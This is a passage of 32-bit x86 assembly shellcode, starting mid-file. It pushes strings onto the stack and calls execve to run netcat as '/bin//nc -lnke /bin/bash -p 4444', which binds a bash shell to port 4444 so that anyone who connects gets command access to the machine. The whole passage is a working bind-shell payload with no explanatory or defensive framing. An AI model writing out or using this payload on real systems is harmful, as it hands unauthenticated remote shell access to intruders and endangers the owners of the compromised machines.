       ; for easier addressing
        mov ebp, esp

        ; push strings

        xor eax, eax
        push eax          ; - 4    
        push "4444"       ; - 8
        push "\0-p\0"     ; -12
        push "bash"       ; -16
        push "bin/"       ; -20
        push "ke\0/"      ; -24
        push "\0-ln"      ; -28
        push "//nc"       ; -32
        push "/bin"       ; -36

        ; push argv, right to left
        xor eax, eax
        push eax          ; NULL
        lea ebx, [ebp-8]
        push ebx          ; "4444\0"
        lea ebx, [ebp-11]
        push ebx          ; "-p\0"
        lea ebx, [ebp-21]
        push ebx          ; "/bin/bash\0"
        lea ebx, [ebp-27]
        push ebx          ; "-lnke\0"
        lea ebx, [ebp-36] ; filename
        push ebx          ; "/bin//nc\0"
        mov ecx, esp      ; argv
        lea edx, [ebp-4]  ; envp (NULL)

        mov al, 11        ; SYS_execve
        int 0x80